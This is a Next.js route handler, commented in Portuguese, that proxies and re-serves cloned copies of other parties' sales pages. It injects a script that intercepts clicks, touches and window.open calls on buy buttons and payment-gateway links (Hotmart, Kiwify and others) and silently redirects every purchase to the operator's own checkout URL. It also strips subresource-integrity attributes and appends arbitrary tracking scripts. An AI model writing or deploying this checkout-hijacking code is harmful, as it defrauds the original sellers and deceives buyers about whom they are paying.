import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';
import * as cheerio from 'cheerio';

/**
 * Page Proxy God Mode v7.0 — Original Stable
 */

export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;

    // 1. Buscar página com fallback inteligente
    let { data: page, error } = await supabaseAdmin
      .from('cloned_pages')
      .select('*')
      .eq('id', id)
      .single();

    // Se não achar pelo ID (ex: /p/resultado), pega o último clone para manter a navegação ativa
    if (error || !page) {
      const { data: fallback } = await supabaseAdmin
        .from('cloned_pages')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(1)
        .single();
      page = fallback;
    }

    if (!page || !page.original_url) {
      return new NextResponse('<h1>Página não encontrada</h1>', { status: 404 });
    }

    const config = page.config || {};
    const originalUrl = page.original_url;
    const checkoutUrl = config.checkout_url || '';

    const response = await fetch(originalUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      },
    });

    if (!response.ok) {
      return new NextResponse(`<h1>Erro site original (${response.status})</h1>`, { status: 502 });
    }

    const buffer = await response.arrayBuffer();
    const rawHtml = new TextDecoder('utf-8').decode(buffer);
    const $ = cheerio.load(rawHtml);
    const baseUrl = new URL(originalUrl).origin;
    const targetHost = new URL(originalUrl).host;
    const currentOrigin = req.nextUrl.origin;

    // 1. BASE TAG (O que resolvia lindamente)
    $('base').remove();
    $('head').prepend(`<base href="${originalUrl}">`);

    // 2. Script para Checkout (Agressivo porém Preciso)
    const engineScript = `
      <script>
        (function() {
          const CHECKOUT_URL = '${checkoutUrl}';
          const gateways = ['checkout', 'pay.', 'comprar', 'hotmart', 'eduzz', 'monetizze', 'kiwify', 'braip', 'cakto', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper', 'lowify', 'ironpay', 'lastlink', 'kirvano'];
          
          function isCheckoutUrl(url) {
             if (!url) return false;
             const lower = url.toLowerCase();
             return gateways.some(g => lower.includes(g));
          }

          function isCheckoutText(text) {
             if (!text || text.length > 100) return false;
             const cleanText = text.replace(/\\s+/g, ' ').toLowerCase().trim();
             
             // Termos super específicos para evitar que qualquer "plano" do quiz dispare a compra
             const exactMatches = [
                 'comprar agora', 'comprar', 'fazer checkout', 'ir para o checkout', 
                 'receber agora', 'obter acesso', 'quero o meu plano', 
                 'obter meu plano personalizado', 'obter meu plano personalizado agora',
                 'obter meu plano personalizado agora!', 'quero comprar'
             ];
             return exactMatches.some(m => cleanText === m || cleanText.includes(m)) || gateways.some(g => cleanText.includes(g));
          }

          function forceCheckout(e) {
            if (!CHECKOUT_URL) return;
            if (e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
            }
            const t = new URL(CHECKOUT_URL);
            new URLSearchParams(window.location.search).forEach((v, k) => t.searchParams.set(k, v));
            window.top.location.href = t.toString();
          }

          function handleInteraction(e) {
             let el = e.target;
             let depth = 0;
             while (el && el !== document.body && el !== document.documentElement && depth < 6) {
                const href = el.getAttribute ? (el.getAttribute('href') || '') : '';
                const onclick = el.getAttribute ? (el.getAttribute('onclick') || '') : '';
                const text = el.textContent || '';
                
                if (isCheckoutUrl(href) || isCheckoutUrl(onclick) || isCheckoutText(text)) {
                   forceCheckout(e);
                   return;
                }
                el = el.parentElement;
                depth++;
             }
          }

          // Interceptadores em todas as fases de interação (impede que o Lastlink roube o clique com mousedown/touchend)
          const events = ['click', 'mousedown', 'touchend', 'pointerdown'];
          events.forEach(evt => {
              document.addEventListener(evt, handleInteraction, { capture: true, passive: false });
          });

          // Sobrescrever window.open
          const origOpen = window.open;
          window.open = function(url, target, features) {
             if (CHECKOUT_URL && typeof url === 'string' && isCheckoutUrl(url)) {
                 const t = new URL(CHECKOUT_URL);
                 new URLSearchParams(window.location.search).forEach((v, k) => t.searchParams.set(k, v));
                 return origOpen.call(window, t.toString(), target, features);
             }
             return origOpen.call(window, url, target, features);
          };

          // Patch preventivo de atributos
          function patch() {
            if (!CHECKOUT_URL) return;
            document.querySelectorAll('a, button, [role="button"]').forEach(el => {
              const h = (el.getAttribute('href') || el.getAttribute('onclick') || '').toLowerCase();
              const text = el.textContent || '';
              if (isCheckoutUrl(h) || el.dataset.checkout || isCheckoutText(text)) {
                if (el.tagName === 'A') el.href = CHECKOUT_URL;
                el.onclick = forceCheckout;
                el.onmousedown = forceCheckout;
                el.ontouchend = forceCheckout;
              }
            });
          }
          setInterval(patch, 2000);
        })();
      </script>
    `;
    $('head').append(engineScript);

    // 3. Proxy de Assets (Para não dar tela preta)
    $('[src], [href]').each((_, el) => {
      const tag = $(el).prop('tagName');
      const attr = $(el).attr('src') ? 'src' : 'href';
      let val = $(el).attr(attr) || '';
      if (!val || val.startsWith('data:') || val.startsWith('javascript:') || val.startsWith('#')) return;

      if (tag === 'SCRIPT' || (tag === 'LINK' && $(el).attr('rel') === 'stylesheet')) {
        const abs = val.startsWith('/') ? baseUrl + val : (val.startsWith('http') ? val : baseUrl + '/' + val);
        $(el).attr(attr, `${currentOrigin}/api/proxy?url=${encodeURIComponent(abs)}&overrideHost=${targetHost}`);
        $(el).removeAttr('integrity').removeAttr('crossorigin');
      }
    });

    if (config.pixel_script) $('body').append(config.pixel_script);
    if (config.head_scripts) $('head').append(config.head_scripts);
    if (config.body_scripts) $('body').append(config.body_scripts);

    return new NextResponse($.html(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });

  } catch (error: any) {
    return new NextResponse(`Erro: ${error.message}`, { status: 500 });
  }
}
